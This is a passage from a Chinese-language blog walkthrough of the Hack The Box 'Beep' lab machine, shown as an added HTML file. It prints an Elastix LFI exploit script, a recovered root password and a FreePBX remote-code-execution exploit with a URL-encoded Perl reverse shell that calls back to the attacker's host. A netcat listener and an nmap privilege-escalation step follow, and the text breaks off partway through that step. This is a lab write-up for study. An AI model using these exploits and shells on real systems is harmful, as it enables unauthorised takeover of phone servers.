@@ -1,0 +1,888 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Beep - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Beep靶场信息  靶场类型  信息搜集Nmap┌──(root💀kali)-[~&#x2F;Desktop&#x2F;HTB&#x2F;Easy&#x2F;Beep] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.7        Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-03-04 00:36">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Beep - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Beep靶场信息  靶场类型  信息搜集Nmap┌──(root💀kali)-[~&#x2F;Desktop&#x2F;HTB&#x2F;Easy&#x2F;Beep] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.7        Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-03-04 00:36">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/cc3689db-67a4-4544-82f9-b0aabeb80f7c.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/d82d05cf-780c-4857-93e6-4891dab2a9af.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/2f3a5383-ded3-4a6e-b4ee-b56f6c7448f3.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/d26765f5-20c7-4005-83a8-1d66a513cb38.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/f457f5cd-5496-4784-a724-93f1f240e343.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/dae9ef78-668f-409f-ac5b-bad9f4e0dbaa.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/94e68a76-7657-4b88-9493-b1caab5ab50e.png">
+<meta property="article:published_time" content="2022-03-09T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:40:46.593Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/03/09/Hackthebox/Hackthebox-Beep/cc3689db-67a4-4544-82f9-b0aabeb80f7c.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Beep - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Beep - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-03-09T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-03-09
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Beep"><span class="post-toc-text">Hackthebox - Beep</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Hackthebox-Beep"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Beep - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-03-09 19:38:36" datetime="2022-03-09T11:38:36.000Z"  itemprop="datePublished">2022-03-09</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Beep"><a href="#Hackthebox-Beep" class="headerlink" title="Hackthebox - Beep"></a>Hackthebox - Beep</h1><h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><img src="/2022/03/09/Hackthebox/Hackthebox-Beep/cc3689db-67a4-4544-82f9-b0aabeb80f7c.png" class>
+
+<h2 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h2><img src="/2022/03/09/Hackthebox/Hackthebox-Beep/d82d05cf-780c-4857-93e6-4891dab2a9af.png" class>
+
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><pre><code class="bash">┌──(root💀kali)-[~/Desktop/HTB/Easy/Beep]
+└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.7       
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-04 00:36 EST
+Nmap scan report for 10.10.10.7
+Host is up (6.6s latency).
+Not shown: 64293 filtered ports, 1232 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  tcpwrapped
+| ssh-hostkey: 
+|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
+|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
+25/tcp   open  tcpwrapped
+|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+80/tcp   open  tcpwrapped
+|_http-server-header: Apache/2.2.3 (CentOS)
+|_http-title: Did not follow redirect to https://10.10.10.7/
+110/tcp  open  tcpwrapped
+|_pop3-capabilities: STLS PIPELINING IMPLEMENTATION(Cyrus POP3 server v2) RESP-CODES EXPIRE(NEVER) LOGIN-DELAY(0) TOP UIDL USER AUTH-RESP-CODE APOP
+111/tcp  open  tcpwrapped
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2            111/tcp   rpcbind
+|   100000  2            111/udp   rpcbind
+|   100024  1            875/udp   status
+|_  100024  1            878/tcp   status
+143/tcp  open  tcpwrapped
+|_imap-capabilities: THREAD=ORDEREDSUBJECT NAMESPACE OK MULTIAPPEND X-NETSCAPE QUOTA NO URLAUTHA0001 LISTEXT LIST-SUBSCRIBED CATENATE BINARY ID IDLE RIGHTS=kxte ANNOTATEMORE STARTTLS IMAP4 SORT=MODSEQ Completed IMAP4rev1 ACL UNSELECT RENAME UIDPLUS ATOMIC THREAD=REFERENCES MAILBOX-REFERRALS LITERAL+ CONDSTORE SORT CHILDREN
+443/tcp  open  tcpwrapped
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2017-04-07T08:22:08
+|_Not valid after:  2018-04-07T08:22:08
+|_ssl-date: 2022-03-04T06:40:08+00:00; +59m59s from scanner time.
+993/tcp  open  tcpwrapped
+|_imap-capabilities: CAPABILITY
+995/tcp  open  tcpwrapped
+3306/tcp open  tcpwrapped
+|_sslv2: ERROR: Script execution failed (use -d to debug)
+Device type: firewall
+Running (JUST GUESSING): Fortinet embedded (87%)
+OS CPE: cpe:/h:fortinet:fortigate_100d
+Aggressive OS guesses: Fortinet FortiGate 100D firewall (87%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+
+Host script results:
+|_clock-skew: 59m55s
+
+TRACEROUTE (using port 8888/tcp)
+HOP RTT        ADDRESS
+1   5559.01 ms 10.10.16.1
+2   ... 3
+4   5559.05 ms 10.10.10.7
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 460.47 seconds
+</code></pre>
+<h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p>先来看看80端口的web服务</p>
+<img src="/2022/03/09/Hackthebox/Hackthebox-Beep/2f3a5383-ded3-4a6e-b4ee-b56f6c7448f3.png" class>
+
+<p>是一个Elastix的系统，去搜搜看是否有漏洞</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# searchsploit elastix                   
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                    |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Elastix - &#39;page&#39; Cross-Site Scripting                                                                                                                                             | php/webapps/38078.py
+Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                           | php/webapps/38544.txt
+Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                     | php/webapps/34942.txt
+Elastix 2.2.0 - &#39;graph.php&#39; Local File Inclusion                                                                                                                                  | php/webapps/37637.pl
+Elastix 2.x - Blind SQL Injection                                                                                                                                                 | php/webapps/36305.txt
+Elastix &lt; 2.5 - PHP Code Injection                                                                                                                                                | php/webapps/38091.php
+FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                                            | php/webapps/18650.py
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<p>这里可以看到有几个漏洞，其中一个是LFI（远程文件包含），去看看相关漏洞内容</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# locate php/webapps/37637.pl
+/usr/share/exploitdb/exploits/php/webapps/37637.pl
+
+┌──(root💀kali)-[~/Desktop]
+└─# cat /usr/share/exploitdb/exploits/php/webapps/37637.pl
+source: https://www.securityfocus.com/bid/55078/info
+
+Elastix is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker can exploit this vulnerability to view files and execute local scripts in the context of the web server process. This may aid in further attacks.
+
+Elastix 2.2.0 is vulnerable; other versions may also be affected. 
+
+#!/usr/bin/perl -w
+
+#------------------------------------------------------------------------------------# 
+#Elastix is an Open Source Sofware to establish Unified Communications. 
+#About this concept, Elastix goal is to incorporate all the communication alternatives,
+#available at an enterprise level, into a unique solution.
+#------------------------------------------------------------------------------------#
+############################################################
+# Exploit Title: Elastix 2.2.0 LFI
+# Google Dork: :(
+# Author: cheki
+# Version:Elastix 2.2.0
+# Tested on: multiple
+# CVE : notyet
+# romanc-_-eyes ;) 
+# Discovered by romanc-_-eyes
+# vendor http://www.elastix.org/
+
+print &quot;\t Elastix 2.2.0 LFI Exploit \n&quot;;
+print &quot;\t code author cheki   \n&quot;;
+print &quot;\t 0day Elastix 2.2.0  \n&quot;;
+print &quot;\t email: anonymous17hacker{}gmail.com \n&quot;;
+
+#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action
+
+use LWP::UserAgent;
+print &quot;\n Target: https://ip &quot;;
+chomp(my $target=&lt;STDIN&gt;);
+$dir=&quot;vtigercrm&quot;;
+$poc=&quot;current_language&quot;;
+$etc=&quot;etc&quot;;
+$jump=&quot;../../../../../../../..//&quot;;
+$test=&quot;amportal.conf%00&quot;;
+
+$code = LWP::UserAgent-&gt;new() or die &quot;inicializacia brauzeris\n&quot;;
+$code-&gt;agent(&#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)&#39;);
+$host = $target . &quot;/&quot;.$dir.&quot;/graph.php?&quot;.$poc.&quot;=&quot;.$jump.&quot;&quot;.$etc.&quot;/&quot;.$test.&quot;&amp;module=Accounts&amp;action&quot;;
+$res = $code-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));
+$answer = $res-&gt;content; if ($answer =~ &#39;This file is part of FreePBX&#39;) {
+
+print &quot;\n read amportal.conf file : $answer \n\n&quot;;
+print &quot; successful read\n&quot;;
+
+}
+else { 
+print &quot;\n[-] not successful\n&quot;;
+        }
+</code></pre>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>根据Exploit中提到的，构造一个任意文件读取的Payload</p>
+<pre><code class="bash">view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action
+</code></pre>
+<img src="/2022/03/09/Hackthebox/Hackthebox-Beep/d26765f5-20c7-4005-83a8-1d66a513cb38.png" class>
+
+<p>成功读取到一个账号密码</p>
+<pre><code class="bash">username = admin
+password = jEhdIekWmdjE
+</code></pre>
+<p>我们去尝试登录一下</p>
+<img src="/2022/03/09/Hackthebox/Hackthebox-Beep/f457f5cd-5496-4784-a724-93f1f240e343.png" class>
+
+<p>登入后似乎是一个仪表盘，但没什么可以利用的</p>
+<img src="/2022/03/09/Hackthebox/Hackthebox-Beep/dae9ef78-668f-409f-ac5b-bad9f4e0dbaa.png" class>
+
+<p>经过尝试后发现&#x2F;admin目录是一个另外的登录口，也可使用这个账号密码进行登录</p>
+<p>但登入后也没看到什么明显的利用点</p>
+<p>这边倒是可以直接使用ssh进行登录，先给大家演示一下直接登录的方法，再演示其他的利用方式</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ssh root@10.10.10.7                                                       
+Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
+</code></pre>
+<p>这边提示需要指定kex算法，去指定一下</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ssh root@10.10.10.7 -o KexAlgorithms=diffie-hellman-group1-sha1                                                                                                                                           255 ⨯
+The authenticity of host &#39;10.10.10.7 (10.10.10.7)&#39; can&#39;t be established.
+RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.10.10.7&#39; (RSA) to the list of known hosts.
+root@10.10.10.7&#39;s password: 
+Last login: Tue Jul 16 11:45:47 2019
+
+Welcome to Elastix 
+----------------------------------------------------
+
+To access your Elastix System, using a separate workstation (PC/MAC/Linux)
+Open the Internet Browser using the following URL:
+http://10.10.10.7
+
+[root@beep ~]# whoami&amp;&amp;id
+root
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+</code></pre>
+<p>可以直接使用网页中获取到的密码进行登录，不过这种猜密码是否可以利用的方式显然不符合我的想法，还是得测试漏洞</p>
+<img src="/2022/03/09/Hackthebox/Hackthebox-Beep/94e68a76-7657-4b88-9493-b1caab5ab50e.png" class>
+
+<p>进入<a href="https://10.10.10.7/admin%E7%84%B6%E5%90%8E%E5%8F%96%E6%B6%88%E7%99%BB%E5%BD%95%E6%A1%86%EF%BC%8C%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0FreePBX%E7%9A%84%E7%89%88%E6%9C%AC%EF%BC%8C%E5%8E%BBsearchspolit%E4%B8%80%E4%B8%8B" target="_blank" rel="noopener">https://10.10.10.7/admin然后取消登录框，即可看到FreePBX的版本，去searchspolit一下</a></p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# searchsploit FreePBX
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                    |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+FreePBX - &#39;config.php&#39; Remote Code Execution (Metasploit)                                                                                                                         | unix/remote/32512.rb
+FreePBX 13 - Remote Command Execution / Privilege Escalation                                                                                                                      | php/webapps/40614.py
+FreePBX 13.0.35 - Remote Command Execution                                                                                                                                        | php/webapps/40296.txt
+FreePBX 13.0.35 - SQL Injection                                                                                                                                                   | php/webapps/40312.txt
+FreePBX 13.0.x &lt; 13.0.154 - Remote Command Execution                                                                                                                              | php/webapps/40345.txt
+FreePBX 13/14 - Remote Command Execution / Privilege Escalation                                                                                                                   | linux/remote/40232.py
+FreePBX 2.1.3 - &#39;upgrade.php&#39; Remote File Inclusion                                                                                                                               | php/webapps/2665.txt
+FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                                            | php/webapps/18650.py
+FreePBX 2.11.0 - Remote Command Execution                                                                                                                                         | php/webapps/32214.pl
+FreePBX 2.2 - SIP Packet Multiple HTML Injection Vulnerabilities                                                                                                                  | multiple/remote/29873.php
+FreePBX 2.5.1 - SQL Injection                                                                                                                                                     | multiple/webapps/11186.txt
+FreePBX 2.5.2 - &#39;/admin/config.php?tech&#39; Cross-Site Scripting                                                                                                                     | php/webapps/33442.txt
+FreePBX 2.5.2 - Zap Channel Addition Description Parameter Cross-Site Scripting                                                                                                   | php/webapps/33443.txt
+FreePBX 2.5.x - Information Disclosure                                                                                                                                            | multiple/webapps/11187.txt
+FreePBX 2.5.x &lt; 2.6.0 - Persistent Cross-Site Scripting                                                                                                                           | multiple/webapps/11184.txt
+FreePBX 2.8.0 - Recordings Interface Allows Remote Code Execution                                                                                                                 | php/webapps/15098.txt
+FreePBX 2.9.0/2.10.0 - &#39;callmenum&#39; Remote Code Execution (Metasploit)                                                                                                             | php/webapps/18659.rb
+FreePBX 2.9.0/2.10.0 - Multiple Vulnerabilities                                                                                                                                   | php/webapps/18649.txt
+FreePBX &lt; 13.0.188 - Remote Command Execution (Metasploit)                                                                                                                        | php/remote/40434.rb
+Freepbx &lt; 2.11.1.5 - Remote Code Execution                                                                                                                                        | php/webapps/41005.txt
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<p>这里可以看到有一个RCE的漏洞 php&#x2F;webapps&#x2F;18650.py 咱们去查看一下</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/HTB/Easy/Beep]
+└─# cat exploit.py 
+#!/usr/bin/python
+############################################################
+# Exploit Title: FreePBX / Elastix pre-authenticated remote code execution exploit
+# Google Dork: oy vey
+# Date: March 23rd, 2012
+# Author: muts
+# Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others.
+# Tested on: multiple
+# CVE : notyet
+# Blog post : http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/ 
+# Archive Url : http://www.offensive-security.com/0day/freepbx_callmenum.py.txt
+############################################################
+# Discovered by Martin Tschirsich
+# http://seclists.org/fulldisclosure/2012/Mar/234
+# http://www.exploit-db.com/exploits/18649
+############################################################
+import urllib
+rhost=&quot;172.16.254.72&quot;
+lhost=&quot;172.16.254.223&quot;
+lport=443
+extension=&quot;1000&quot;
+
+# Reverse shell payload
+
+url = &#39;https://&#39;+str(rhost)+&#39;/recordings/misc/callme_page.php?action=c&amp;callmenum=&#39;+str(extension)+&#39;@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22&#39;+str(lhost)+&#39;%3a&#39;+str(lport)+&#39;%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A&#39;
+
+urllib.urlopen(url)
+
+# On Elastix, once we have a shell, we can escalate to root:
+# root@bt:~# nc -lvp 443
+# listening on [any] 443 ...
+# connect to [172.16.254.223] from voip [172.16.254.72] 43415
+# id
+# uid=100(asterisk) gid=101(asterisk)
+# sudo nmap --interactive
+
+# Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
+# Welcome to Interactive Mode -- press h &lt;enter&gt; for help
+# nmap&gt; !sh
+# id
+# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+</code></pre>
+<p>稍微做一下修改</p>
+<pre><code class="bash">rhost=&quot;10.10.10.7&quot;
+lhost=&quot;10.10.16.2&quot;
+lport=4444
+extension=&quot;1000&quot;
+</code></pre>
+<p>修改好以后去执行试试</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/HTB/Easy/Beep]
+└─# python exploit.py 
+Traceback (most recent call last):
+  File &quot;exploit.py&quot;, line 27, in &lt;module&gt;
+    urllib.urlopen(url)
+  File &quot;/usr/lib/python2.7/urllib.py&quot;, line 87, in urlopen
+    return opener.open(url)
+  File &quot;/usr/lib/python2.7/urllib.py&quot;, line 215, in open
+    return getattr(self, name)(url)
+  File &quot;/usr/lib/python2.7/urllib.py&quot;, line 445, in open_https
+    h.endheaders(data)
+  File &quot;/usr/lib/python2.7/httplib.py&quot;, line 1078, in endheaders
+    self._send_output(message_body)
+  File &quot;/usr/lib/python2.7/httplib.py&quot;, line 894, in _send_output
+    self.send(msg)
+  File &quot;/usr/lib/python2.7/httplib.py&quot;, line 856, in send
+    self.connect()
+  File &quot;/usr/lib/python2.7/httplib.py&quot;, line 1303, in connect
+    server_hostname=server_hostname)
+  File &quot;/usr/lib/python2.7/ssl.py&quot;, line 369, in wrap_socket
+    _context=self)
+  File &quot;/usr/lib/python2.7/ssl.py&quot;, line 599, in __init__
+    self.do_handshake()
+  File &quot;/usr/lib/python2.7/ssl.py&quot;, line 828, in do_handshake
+    self._sslobj.do_handshake()
+IOError: [Errno socket error] [SSL: UNSUPPORTED_PROTOCOL] unsupported protocol (_ssl.c:727)
+</code></pre>
+<p>这边urllib报错了，想个办法，给删掉改成print输出手动执行试试</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/HTB/Easy/Beep]
+└─# python exploit.py 
+https://10.10.10.7/recordings/misc/callme_page.php?action=c&amp;callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.2%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
+</code></pre>
+<p>去浏览器里访问一下</p>
+<p>去访问后这一段没有弹回shell，去找一下原因</p>
+<p>排查后发现应该是extension的问题，去查找一下正确的extension</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# svwar -m INVITE -e200-300 10.10.10.7
+WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
+ERROR:TakeASip:could not decode to tag
+ERROR:TakeASip:could not decode to tag
+WARNING:TakeASip:extension &#39;239&#39; probably exists but the response is unexpected
+WARNING:TakeASip:extension &#39;241&#39; probably exists but the response is unexpected
+ERROR:TakeASip:could not decode to tag
+ERROR:TakeASip:could not decode to tag
+ERROR:TakeASip:could not decode to tag
+ERROR:TakeASip:could not decode to tag
+ERROR:TakeASip:could not decode to tag
+ERROR:TakeASip:could not decode to tag
+ERROR:TakeASip:could not decode to tag
+ERROR:TakeASip:could not decode to tag
+ERROR:TakeASip:could not decode to tag
+ERROR:TakeASip:could not decode to tag
+ERROR:TakeASip:could not decode to tag
+ERROR:TakeASip:could not decode to tag
+ERROR:TakeASip:could not decode to tag
++-----------+----------------+
+| Extension | Authentication |
++===========+================+
+| 233       | reqauth        |
++-----------+----------------+
+| 239       | weird          |
++-----------+----------------+
+| 241       | weird          |
++-----------+----------------+
+</code></pre>
+<p>正确的是233，咱们去exploit里修改一下，然后重新生成</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop/HTB/Easy/Beep]
+└─# python exploit.py
+https://10.10.10.7/recordings/misc/callme_page.php?action=c&amp;callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.2%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
+</code></pre>
+<p>再去试试</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.3] from (UNKNOWN) [10.10.10.7] 46340
+python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
+bash-3.2$ whoami&amp;&amp;id
+whoami&amp;&amp;id
+asterisk
+uid=100(asterisk) gid=101(asterisk)
+</code></pre>
+<p>成功拿到user权限</p>
+<pre><code class="bash">bash-3.2$ cd /home
+cd /home
+bash-3.2$ ls
+ls
+fanis  spamfilter
+bash-3.2$ cd fanis
+cd fanis
+bash-3.2$ ls
+ls
+user.txt
+bash-3.2$ cat user.txt
+cat user.txt
+e6da504f44f4d004da91498eec298b24
+</code></pre>
+<p>成功拿到user权限的flag文件</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><pre><code class="bash"># On Elastix, once we have a shell, we can escalate to root:
+# root@bt:~# nc -lvp 443
+# listening on [any] 443 ...
+# connect to [172.16.254.223] from voip [172.16.254.72] 43415
+# id
+# uid=100(asterisk) gid=101(asterisk)
+# sudo nmap --interactive
+
+# Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
+# Welcome to Interactive Mode -- press h &lt;enter&gt; for help
+# nmap&gt; !sh
+# id
